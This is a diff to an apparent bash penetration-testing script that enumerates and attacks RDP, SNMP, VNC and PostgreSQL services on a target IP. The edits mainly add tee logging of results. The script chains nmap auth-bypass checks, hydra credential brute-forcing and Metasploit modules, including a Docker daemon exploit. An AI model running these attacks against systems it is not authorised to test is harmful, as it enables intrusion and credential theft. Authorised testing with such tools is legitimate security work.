@@ -167,7 +167,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee tee $results_dir/rdp_results
+nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee $results_dir/rdp_results
 #Brute Force Credentials
 hydra -l username -P passwords.txt $IP rdp | tee -a tee $results_dir/rdp_results
 
@@ -178,11 +178,11 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
-nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP
+nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP | tee  $results_dir/snmp
 #Brute Force the Community Names
-hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp |  tee -a $results_dir/snmp
 #Snmp-Check is SNMP enumerator
-snmp-check $IP -p 161 -c public
+snmp-check $IP -p 161 -c public | tee -a $results_dir/snmp
 
 echo -e $RED_LINE
 
@@ -198,7 +198,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|  Scanning for VNC TEST CASES     |${RESET}"
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee tee $results_dir/vnc_results
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee  $results_dir/vnc_results
 msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; spool $results_dir/vncmsf; set rhosts $IP; run ;spool off ; exit"
 
 echo -e $RED_LINE
@@ -216,10 +216,10 @@ msfconsole -q -x "use exploit/linux/http/docker_daemon_tcp; spool $results_dir/d
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 #5432,5433 - Postgresql
-nmap --script pgsql-brute -p 5432 <target-ip>
+nmap --script pgsql-brute -p 5432 $IP |  tee  $results_dir/Postgresql
 #Brute Force Credentials
-hydra -l username -P passwords.txt <target-ip> postgres
-hydra -L usernames.txt -p password <target-ip> postgres
+hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql
+hydra -L usernames.txt -p password $IP postgres |  tee -a $results_dir/Postgresql
 
 echo -e $RED_LINE
 
